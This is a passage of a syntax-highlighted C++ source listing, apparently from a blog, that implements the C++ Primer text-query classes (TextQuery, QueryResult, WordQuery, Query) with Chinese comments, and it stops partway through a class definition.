class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX 1024</span></span><br><span class="line">unordered_map&lt;string,string&gt;umap&#123;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function">string <span class="title">IsNameReturn</span><span class="params">(string &amp;buf)</span></span>;</span><br><span class="line">string filename;</span><br><span class="line"><span class="type">bool</span> filesearch=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">FileExists</span><span class="params">(<span class="type">const</span> string&amp; filename)</span> </span>&#123;</span><br><span class="line">    <span class="function">ifstream <span class="title">file</span><span class="params">(filename)</span></span>;</span><br><span class="line">    <span class="keyword">return</span> file.<span class="built_in">good</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回的结果类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">QueryResult</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        string inputword;<span class="comment">//需要查询的单词</span></span><br><span class="line">        shared_ptr&lt;set&lt;<span class="type">unsigned</span>&gt;&gt; idx;<span class="comment">//出现的行号</span></span><br><span class="line">        shared_ptr&lt;vector&lt;string&gt;&gt; file;<span class="comment">//查找的文件</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">QueryResult</span>(string s,shared_ptr&lt;set&lt;<span class="type">unsigned</span>&gt;&gt; i,shared_ptr&lt;vector&lt;string&gt;&gt; f):<span class="built_in">inputword</span>(s),<span class="built_in">idx</span>(i),<span class="built_in">file</span>(f)&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;\&quot;&quot;</span>&lt;&lt;<span class="keyword">this</span>-&gt;inputword&lt;&lt;<span class="string">&quot;\&quot;出现了&quot;</span>&lt;&lt;<span class="keyword">this</span>-&gt;idx-&gt;<span class="built_in">size</span>()&lt;&lt;<span class="string">&quot;次&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="comment">//打印出现的每一行</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> num:*(<span class="keyword">this</span>-&gt;idx))&#123;</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot; (line &quot;</span>&lt;&lt;num+<span class="number">1</span>&lt;&lt;<span class="string">&quot;) &quot;</span>;</span><br><span class="line">            cout&lt;&lt;*(<span class="keyword">this</span>-&gt;file-&gt;<span class="built_in">begin</span>()+num)&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">write</span><span class="params">(ofstream&amp; ofs)</span></span>&#123;</span><br><span class="line">        ofs&lt;&lt;<span class="string">&quot;\&quot;&quot;</span>&lt;&lt;<span class="keyword">this</span>-&gt;inputword&lt;&lt;<span class="string">&quot;\&quot;出现了&quot;</span>&lt;&lt;<span class="keyword">this</span>-&gt;idx-&gt;<span class="built_in">size</span>()&lt;&lt;<span class="string">&quot;次&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> num:*(<span class="keyword">this</span>-&gt;idx))&#123;</span><br><span class="line">            ofs&lt;&lt;<span class="string">&quot; (line &quot;</span>&lt;&lt;num+<span class="number">1</span>&lt;&lt;<span class="string">&quot;) &quot;</span>;</span><br><span class="line">            ofs&lt;&lt;*(<span class="keyword">this</span>-&gt;file-&gt;<span class="built_in">begin</span>()+num)&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// for(const string &amp;s:newbuf)&#123;</span></span><br><span class="line">        <span class="comment">//     ofs&lt;&lt;s&lt;&lt;endl;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">    shared_ptr&lt;vector&lt;string&gt;&gt; <span class="built_in">getfile</span>()&#123;<span class="comment">//返回file的共享指针</span></span><br><span class="line">        <span class="keyword">return</span> file;</span><br><span class="line">    &#125;</span><br><span class="line">    shared_ptr&lt;set&lt;<span class="type">unsigned</span>&gt;&gt; <span class="built_in">getset</span>()&#123;<span class="comment">//返回行号的共享指针</span></span><br><span class="line">        <span class="keyword">return</span> idx;</span><br><span class="line">    &#125;</span><br><span class="line">    shared_ptr&lt;set&lt;<span class="type">unsigned</span>&gt;&gt; <span class="built_in">getfileset</span>()&#123;<span class="comment">//返回整体行号的共享指针</span></span><br><span class="line">        shared_ptr&lt;set&lt;<span class="type">unsigned</span>&gt;&gt; fileset =make_shared&lt;set&lt;<span class="type">unsigned</span>&gt;&gt;();;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;file-&gt;<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            fileset-&gt;<span class="built_in">insert</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> fileset;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TextQuery</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">    shared_ptr&lt;vector&lt;string&gt;&gt; file;<span class="comment">//存储文章的向量只能得指针</span></span><br><span class="line">    map&lt;string,shared_ptr&lt;set&lt;<span class="type">unsigned</span>&gt;&gt;&gt; wordmap;<span class="comment">//用unsigned存储行号</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">//初始化需要一个文件流。</span></span><br><span class="line">    <span class="built_in">TextQuery</span>(ifstream&amp; is):<span class="built_in">file</span>(<span class="keyword">new</span> vector&lt;string&gt;)<span class="comment">//对文件流的单词句子进行解读</span></span><br><span class="line">    &#123;</span><br><span class="line">        string text;</span><br><span class="line">        <span class="keyword">while</span>(<span class="built_in">getline</span>(is,text))<span class="comment">//获取每一行</span></span><br><span class="line">        &#123;<span class="comment">//file是一个vector对象</span></span><br><span class="line">            file-&gt;<span class="built_in">push_back</span>(text);</span><br><span class="line">            <span class="type">int</span> n=file-&gt;<span class="built_in">size</span>()<span class="number">-1</span>;<span class="comment">//也就是行号？下标？</span></span><br><span class="line">            <span class="function">istringstream <span class="title">line</span><span class="params">(text)</span></span>;</span><br><span class="line">            string word;</span><br><span class="line">            <span class="keyword">while</span>(line &gt;&gt; word)<span class="comment">//用string这个流分解单词</span></span><br><span class="line">            &#123;<span class="comment">//匹配每一个单词</span></span><br><span class="line">                shared_ptr&lt;set&lt;<span class="type">unsigned</span>&gt;&gt; lines;<span class="comment">//map的值是一个(set对象的)智能指针</span></span><br><span class="line">                <span class="keyword">if</span>(!wordmap.<span class="built_in">count</span>(word))&#123;<span class="comment">//如果不存在，说明是新单词，开辟一个set空间，并初始化</span></span><br><span class="line">                    lines = make_shared&lt;set&lt;<span class="type">unsigned</span>&gt;&gt;();</span><br><span class="line">                    wordmap[word] = lines;</span><br><span class="line">                &#125;</span><br><span class="line">                wordmap[word]-&gt;<span class="built_in">insert</span>(n);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">QueryResult <span class="title">query</span><span class="params">(<span class="type">const</span> string&amp; inputword)</span><span class="type">const</span><span class="comment">//返回查找结果，查找结果是一个queryRE对象</span></span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment">//如果未找到，就直接返回一个指向空的set的set共享指针</span></span><br><span class="line">        <span class="type">static</span> shared_ptr&lt;set&lt;<span class="type">unsigned</span>&gt;&gt; <span class="built_in">nodata</span>(<span class="keyword">new</span> <span class="built_in">set</span>&lt;<span class="type">unsigned</span>&gt;());<span class="comment">//返回智能指针指向空set</span></span><br><span class="line">        <span class="keyword">auto</span> loc=wordmap.<span class="built_in">find</span>(inputword);</span><br><span class="line">        <span class="keyword">if</span>(loc == wordmap.<span class="built_in">end</span>())&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">QueryResult</span>(inputword,nodata,file);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">QueryResult</span>(inputword,loc-&gt;second,file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">QueryBase</span>&#123;</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> <span class="title class_">Query</span>;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="type">unsigned</span> idx;</span><br><span class="line">    <span class="keyword">virtual</span> ~<span class="built_in">QueryBase</span>()&#123;&#125;;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> QueryResult <span class="title">eval</span><span class="params">(<span class="type">const</span> TextQuery&amp;)</span><span class="type">const</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> string <span class="title">rep</span><span class="params">()</span><span class="type">const</span></span>&#123;&#125;<span class="comment">//生成用于查询的rep文本</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WordQuery</span> : <span class="keyword">public</span> QueryBase&#123;</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> <span class="title class_">Query</span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    ~<span class="built_in">WordQuery</span>() <span class="keyword">override</span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">//构造函数，接收string</span></span><br><span class="line">    <span class="built_in">WordQuery</span>(<span class="type">const</span> string &amp;s):<span class="built_in">query_word</span>(s)&#123;&#125;</span><br><span class="line">    <span class="comment">//重载虚构函数</span></span><br><span class="line">    <span class="function">QueryResult <span class="title">eval</span><span class="params">(<span class="type">const</span> TextQuery &amp;t)</span><span class="type">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> t.<span class="built_in">query</span>(query_word);<span class="comment">//wordquery返回的结果就是根据单词本身返回的QueryRE</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">string <span class="title">rep</span><span class="params">()</span> <span class="type">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> query_word;</span><br><span class="line">    &#125;</span><br><span class="line">    string query_word;</span><br><span class="line">    </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Query</span>&#123;</span><br><span class="line">    <span class="comment">//对三个运算符友元</span></span><br><span class="line">    <span class="keyword">friend</span> Query <span class="keyword">operator</span> ~(<span class="type">const</span> Query&amp;);</span><br><span class="line">    <span class="keyword">friend</span> Query <span class="keyword">operator</span> |(<span class="type">const</span> Query&amp; ,<span class="type">const</span> Query &amp;);</span><br><span class="line">    <span class="keyword">friend</span> Query <span class="keyword">operator</span> &amp;(<span class="type">const</span> Query&amp; ,<span class="type">const</span> Query &amp;);</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">//构造函数shared_ptr</span></span><br><span class="line">    <span class="comment">//传进来是 指向QueryBase类型的 共享指针</span></span><br><span class="line">    shared_ptr&lt;QueryBase&gt; q;<span class="comment">//指向基类的指针</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Query</span>(shared_ptr&lt;QueryBase&gt; query):<span class="built_in">q</span>(query)&#123;&#125;;</span><br><span class="line">    Query&amp; <span class="keyword">operator</span> =(<span class="type">const</span> Query&amp; que)&#123;</span><br><span class="line">        q=que.q;</span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">Query</span>(<span class="type">const</span> string &amp;s)&#123;</span><br><span class="line">        <span class="function">shared_ptr&lt;WordQuery&gt; <span class="title">ptr</span><span class="params">(<span class="keyword">new</span> WordQuery(s))</span></span>;</span><br><span class="line">        q=ptr;</span><br><span class="line">    &#125;<span class="comment">//传进来是string类型的 用来构建WordQuery,来创建Query的q成员</span></span><br><span class="line">    <span class="function">QueryResult <span class="title">eval</span><span class="params">(<span class="type">const</span> TextQuery &amp;t)</span><span class="type">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> q-&gt;<span class="built_in">eval</span>(t);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">string <span class="title">rep</span> <span class="params">()</span><span class="type">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> q-&gt;<span class="built_in">rep</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">friend</span> ostream &amp; <span class="keyword">operator</span>&lt;&lt;(ostream &amp;os,<span class="type">const</span> Query&amp; query)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> os &lt;&lt; query.<span class="built_in">rep</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NotQuery</span> : <span class="keyword">public</span> QueryBase&#123;</span><br><span class="line">    <span class="keyword">friend</span> Query <span class="keyword">operator</span> ~(<span class="type">const</span> Query &amp;);</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    ~<span 